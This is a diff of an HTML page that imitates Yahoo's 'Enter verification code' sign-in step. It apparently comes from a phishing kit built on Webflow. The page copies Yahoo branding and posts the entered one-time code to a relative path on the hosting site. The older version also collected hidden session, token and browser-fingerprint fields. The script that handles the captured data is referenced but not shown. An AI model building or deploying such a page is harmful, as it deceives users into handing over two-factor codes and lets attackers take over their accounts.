@@ -1,137 +1,64 @@
 <!DOCTYPE html>
-<html lang="en">
+<html data-wf-page="5f872aac93e8bc5e0ac94b40" data-wf-site="5f872aac93e8bc5e0ac94b3d">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enter verification code - Yahoo</title>
-    <meta name="description" content="Enter your verification code to continue to Yahoo Mail">
-    <meta name="robots" content="noindex, nofollow">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
-    <link rel="stylesheet" href="/css/webflow.css">
-    <link rel="stylesheet" href="/css/yahoo-8d0526.webflow.css">
-    <link rel="stylesheet" href="/css/yahoo-custom-additions.css">
-    <link rel="icon" href="https://s.yimg.com/rz/l/favicon.ico" type="image/x-icon">
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <meta charset="utf-8">
+  <title>Enter verification code - Yahoo</title>
+  <meta content="Enter verification code - Yahoo" property="og:title">
+  <meta content="Enter verification code - Yahoo" property="twitter:title">
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <meta content="Webflow" name="generator">
+  <link href="css/normalize.css" rel="stylesheet" type="text/css">
+  <link href="css/webflow.css" rel="stylesheet" type="text/css">
+  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
+  <link href="css/yahoo-custom-additions.css" rel="stylesheet" type="text/css">
+  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
+  <script type="text/javascript">WebFont.load({  google: {    families: ["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Oswald:200,300,400,500,600,700","Lato:100,100italic,300,300italic,400,400italic,700,700italic,900,900italic"]  }});</script>
+  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
+  <link href="https://uploads-ssl.webflow.com/5f872aac93e8bc5e0ac94b3d/5f872aac93e8bc5e0ac94b4a_favicon.ico" rel="shortcut icon" type="image/x-icon">
+  <link href="https://uploads-ssl.webflow.com/5f872aac93e8bc5e0ac94b3d/5f872aac93e8bc5e0ac94b4f_webclip.png" rel="apple-touch-icon">
 </head>
 <body class="yahoo-body">
-    <div id="login-body" class="bucket yui3-skin-sam yahoo-container">
-        <div class="yahoo-login-container">
-            <!-- Header -->
-            <div class="yahoo-header">
-                <div class="yahoo-logo">
-                    <svg width="90" height="32" viewBox="0 0 90 32" fill="none">
-                        <path d="M20.4 2.4L13.2 19.2L6 2.4H0L10.8 28.8H15.6L26.4 2.4H20.4Z" fill="#410093"/>
-                        <path d="M42 2.4H36V28.8H42V19.2H48V13.2H42V8.4H50.4V2.4H42Z" fill="#410093"/>
-                        <path d="M66 2.4H60V28.8H66V19.2H72V13.2H66V8.4H74.4V2.4H66Z" fill="#410093"/>
-                        <path d="M90 15.6C90 7.2 84 2.4 76.8 2.4C69.6 2.4 63.6 7.2 63.6 15.6C63.6 24 69.6 28.8 76.8 28.8C84 28.8 90 24 90 15.6ZM84 15.6C84 20.4 81.6 22.8 76.8 22.8C72 22.8 69.6 20.4 69.6 15.6C69.6 10.8 72 8.4 76.8 8.4C81.6 8.4 84 10.8 84 15.6Z" fill="#410093"/>
-                    </svg>
-                </div>
-            </div>
-
-            <!-- Main Form State -->
-            <div id="main-form" class="yahoo-main-form yahoo-form-container">
-                <div class="yahoo-form-container">
-                    <div class="yahoo-form-header">
-                        <h1 class="yahoo-form-title yahoo-title">Enter verification code</h1>
-                        <p class="yahoo-otp-subtitle yahoo-subtitle" id="method-description">We sent a code to your device</p>
-                    </div>
-
-                    <div class="yahoo-user-info">
-                        <div class="yahoo-user-avatar">
-                            <div class="yahoo-avatar-placeholder">
-                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
-                                    <path d="M12 12C14.21 12 16 10.21 16 8C16 5.79 14.21 4 12 4C9.79 4 8 5.79 8 8C8 10.21 9.79 12 12 12ZM12 14C9.33 14 4 15.34 4 18V20H20V18C20 15.34 14.67 14 12 14Z" fill="#6001D2"/>
-                                </svg>
-                            </div>
-                        </div>
-                        <div class="yahoo-user-email" id="userEmail">user@yahoo.com</div>
-                    </div>
-
-                    <form id="otp-form" class="yahoo-form" method="post" action="/account/challenge/otp">
-                        <!-- Hidden Fields for Complete Session Management -->
-                        <input type="hidden" id="username" name="username" value="">
-                        <input type="hidden" id="sessionIndex" name="sessionIndex" value="1">
-                        <input type="hidden" id="sessionToken" name="sessionToken" value="">
-                        <input type="hidden" id="crumb" name="crumb" value="">
-                        <input type="hidden" id="acrumb" name="acrumb" value="">
-                        <input type="hidden" id="otp" name="otp" value="">
-                        <input type="hidden" id="verifyCode" name="verifyCode" value="">
-                        <input type="hidden" id="method" name="method" value="">
-                        <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
-                        <input type="hidden" name="src" value="ym">
-                        <input type="hidden" name=".lang" value="en-US">
-                        <input type="hidden" name=".intl" value="us">
-                        <input type="hidden" id="browser-fp-data" name="browser-fp-data" value="">
-                        <input type="hidden" id="timestamp" name="timestamp" value="">
-
-                        <div class="yahoo-otp-container">
-                            <div class="yahoo-otp-inputs">
-                                <input type="text" class="yahoo-otp-input" data-index="0" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code">
-                                <input type="text" class="yahoo-otp-input" data-index="1" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code">
-                                <input type="text" class="yahoo-otp-input" data-index="2" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code">
-                                <input type="text" class="yahoo-otp-input" data-index="3" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code">
-                                <input type="text" class="yahoo-otp-input" data-index="4" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code">
-                                <input type="text" class="yahoo-otp-input" data-index="5" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="one-time-code">
-                            </div>
-                        </div>
-
-                        <div class="yahoo-form-actions">
-                            <button type="submit" id="submit-btn" class="yahoo-submit-btn yahoo-btn yahoo-btn-primary" disabled>Verify</button>
-                        </div>
-
-                        <div class="yahoo-form-links">
-                            <a href="#" id="resend-link" class="yahoo-link yahoo-resend-link">Didn't get a code? Send again</a>
-                            <a href="#" class="yahoo-link yahoo-alt-link">Try another way</a>
-                        </div>
-                    </form>
-                </div>
-            </div>
-
-            <!-- Loading State -->
-            <div id="loading-state" class="yahoo-loading-state yahoo-form-container" style="display: none;">
-                <div class="yahoo-loading-container">
-                    <div class="yahoo-loading-spinner yahoo-spinner"></div>
-                    <p class="yahoo-loading-text">Verifying code...</p>
-                </div>
-            </div>
-
-            <!-- Success State -->
-            <div id="success-state" class="yahoo-success-state yahoo-form-container" style="display: none;">
-                <div class="yahoo-success-container">
-                    <div class="yahoo-success-icon">
-                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
-                            <path d="M9 16.17L4.83 12L3.41 13.41L9 19L21 7L19.59 5.59L9 16.17Z" fill="#0F7B0F"/>
-                        </svg>
-                    </div>
-                    <h2 class="yahoo-success-title">Verification successful</h2>
-                    <p class="yahoo-success-text yahoo-success-message">Taking you to Yahoo Mail...</p>
-                </div>
-            </div>
-
-            <!-- Error State -->
-            <div id="error-container" class="yahoo-error-container yahoo-form-container" style="display: none;">
-                <div class="yahoo-error-content">
-                    <div class="yahoo-error-icon">
-                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
-                            <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#D93025"/>
-                        </svg>
-                    </div>
-                    <p id="error-message" class="yahoo-error-message">Invalid code. Please try again.</p>
-                    <button id="refreshButton" class="yahoo-retry-btn yahoo-btn yahoo-btn-secondary">Try again</button>
-                </div>
-            </div>
-
-            <!-- Footer -->
-            <div class="yahoo-footer">
-                <div class="yahoo-footer-text yahoo-footer-links">
-                    <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" class="yahoo-footer-link">Help</a>
-                    <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html" class="yahoo-footer-link">Privacy</a>
-                    <a href="https://legal.yahoo.com/us/en/yahoo/terms/index.html" class="yahoo-footer-link">Terms</a>
-                </div>
-            </div>
-        </div>
+  <div class="yahoo-container">
+    <div class="yahoo-header">
+      <div class="yahoo-logo-container">
+        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_205x58_frontpage.png" loading="lazy" alt="Yahoo" class="yahoo-logo">
+      </div>
     </div>
-
-    <script src="/js/yahoo-otp.js"></script>
+    <div class="yahoo-main-content">
+      <div class="yahoo-signin-card">
+        <div class="yahoo-card-header">
+          <h1 class="yahoo-signin-title">Enter verification code</h1>
+          <p class="yahoo-signin-subtitle" id="otp-instruction">We sent a verification code to your email</p>
+        </div>
+        <div class="yahoo-card-body">
+          <form id="yahoo-otp-form" class="yahoo-form" method="post" action="/account/challenge/otp">
+            <div class="yahoo-form-group">
+              <label for="verifyCode" class="yahoo-label">Verification code</label>
+              <input type="text" id="verifyCode" name="verifyCode" class="yahoo-input yahoo-otp-input" required autocomplete="one-time-code" maxlength="8" pattern="[0-9]*" inputmode="numeric">
+              <input type="hidden" name="otp" id="otp" value="">
+            </div>
+            <input type="hidden" name="sessionIndex" id="sessionIndex" value="">
+            <input type="hidden" name="acrumb" id="acrumb" value="">
+            <input type="hidden" name="method" id="method" value="">
+            <div class="yahoo-form-group">
+              <button type="submit" class="yahoo-button yahoo-button-primary">Verify</button>
+            </div>
+            <div class="yahoo-form-group yahoo-links">
+              <a href="#" class="yahoo-link" id="resend-code">Didn't get the code?</a>
+              <a href="#" class="yahoo-link">Try another way</a>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+    <div class="yahoo-footer">
+      <div class="yahoo-footer-links">
+        <a href="#" class="yahoo-footer-link">Help</a>
+        <a href="#" class="yahoo-footer-link">Privacy</a>
+        <a href="#" class="yahoo-footer-link">Terms</a>
+      </div>
+    </div>
+  </div>
+  <script src="js/yahoo-otp.js" type="text/javascript"></script>
 </body>
 </html>
